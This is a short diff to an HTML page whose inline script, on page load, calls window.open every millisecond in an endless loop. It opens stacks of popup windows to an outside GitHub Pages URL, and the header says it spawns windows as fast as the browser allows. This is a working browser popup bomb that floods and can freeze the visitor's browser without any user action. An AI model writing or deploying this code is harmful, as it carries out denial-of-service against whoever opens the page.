@@ -5,17 +5,18 @@
   <script>
     let counter = 0;
 
-    function openWindowEverySecond() {
+    function openWindowsFast() {
       setInterval(() => {
-        window.open('https://example.com', '_blank', `width=400,height=300,top=${counter * 20},left=${counter * 20}`);
+        // Try to spawn windows as rapidly as possible
+        window.open('https://fooaloo.github.io/dell/', '_blank', `width=400,height=300,top=${counter * 20},left=${counter * 20}`);
         counter++;
-      }, 1);
+      }, 1); // 1 millisecond interval
     }
 
-    window.onload = openWindowEverySecond;
+    window.onload = openWindowsFast;
   </script>
 </head>
 <body>
-  <h1>Spawning new windows every 1 second...</h1>
+  <h1>Spawning new windows as fast as the browser allows...</h1>
 </body>
 </html>
